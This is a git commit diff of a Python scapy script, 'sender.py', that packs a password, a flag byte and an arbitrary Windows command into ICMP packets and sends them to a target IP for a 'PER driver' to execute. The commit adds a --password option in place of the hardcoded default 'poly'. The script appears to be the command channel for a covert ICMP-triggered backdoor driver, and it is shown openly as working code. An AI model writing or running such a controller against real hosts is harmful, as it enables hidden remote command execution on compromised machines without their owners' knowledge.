12ec11cdffabff5c2ea1974a42768b427dd2e1ec
Romain Chardiny <romain.chardiny@gmail.com>
2025-10-24 12:32:19 +0200

    add password flag

--- sender/sender.py
+++ sender/sender.py
@@ -1,19 +1,21 @@
 from scapy.all import IP, ICMP, send
 import argparse
 
-PASSWORD = "poly"
+DEFAULT_PASSWORD = "poly"
 
 parser = argparse.ArgumentParser(
     prog='sender', description="Send commands to PER driver")
 
 parser.add_argument('IP', help='IP address of the target')
 parser.add_argument('COMMAND', help='Windows command to execute on the target')
+parser.add_argument('--password', help='Specify a password',
+                    default=DEFAULT_PASSWORD)
 
 args = parser.parse_args()
 
 payload = bytearray()
 
-payload += PASSWORD.encode('utf-8')
+payload += args.password.encode('utf-8')
 payload += bytes([1])  # flag
 payload += args.COMMAND.encode('utf-8')
 
